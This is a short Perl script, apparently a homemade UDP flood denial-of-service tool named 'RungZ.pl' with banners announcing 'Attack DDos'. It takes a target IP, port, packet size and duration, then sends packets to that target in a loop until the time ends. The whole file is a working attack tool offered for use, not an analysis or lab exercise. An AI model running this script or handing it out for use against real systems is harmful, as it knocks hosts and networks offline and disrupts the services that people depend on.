#!/usr/bin/perl 

use Socket;
use strict;

if ($#ARGV != 3) {
  system("clear || cls");
#Script Banner================================================================
print q{
===============================================================================
    ::::::::Script::::::::By::::::::Rachrefresh::::::::      
:#: Attack DDos...
:#:Attack DDos...
:#:HOME-DDos...                 
===============================================================================

             > ScriptBYRACHREFRESH <
 };
# INPUT TARGET INFO ==============================================
 print " \n";
 print "DDOS NET FIBER:) // \n\n";
 print "Commande: perl RungZ.pl <IP> <PORT> <size> <TIME>\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Impossible de se connecter �  $ip\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print  "START ATTACK IP $ip
START ATTACK port " . ($port ? $port : "random"). " \n";

print " \n";
print  "::::RungZ::::.$100%... \n";
print "Attaque arrêtée avec Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+300;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}